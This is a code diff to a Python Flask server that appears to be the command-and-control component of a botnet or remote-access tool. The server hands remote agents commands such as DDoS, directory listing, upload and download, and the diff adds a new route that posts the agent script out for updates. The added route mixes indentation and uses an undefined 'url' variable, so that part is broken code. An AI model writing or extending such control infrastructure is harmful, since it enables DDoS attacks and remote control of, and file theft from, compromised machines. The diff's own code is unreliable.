@@ -5,10 +5,11 @@ import requests
 
 SLPort = "8888"
 
-avail_commands = ["Standby", "DDoS", "pwd", "ls", "cd", "upload"]
+avail_commands = ["Standby", "DDoS", "pwd", "ls", "cd", "upload", "download"]
 
 current_command = "pwd"
-path = "/"
+extra = "/"
+agent_name = "Agent/Agent.py"
 
 app = Flask(__name__)
 
@@ -25,16 +26,16 @@ def get_script():
 @app.route('/set_action', methods = ['POST'])
 def set_action():
 	global current_command
-	global path
+	global extra
 	body = request.get_json()
 	# print(body['command'], body['path'])
 	if "command" in body and body["command"] in avail_commands:
 		current_command = body["command"]
 		print(current_command)
-		if 'path' in body:
-			path = body['path']
+		if 'extra' in body:
+			extra = body['extra']
 		else:
-			path = ''
+			extra = ''
 
 	return '200'
 
@@ -55,9 +56,19 @@ def upload_file():
 def get_command():
 	ret = {
 		"command": current_command,
-		"path": path
+		"extra": extra
 	}
 	return jsonify(ret)
+
+@app.route('/update_agent', methods = ['GET'])
+def update_agent():
+	fin = open(agent_name, 'rb')
+    files = {'file': fin}
+    try:
+        r = requests.post(url, files=files)
+        print (r.text)
+    finally:
+        fin.close()
 
 
 if __name__ == "__main__":
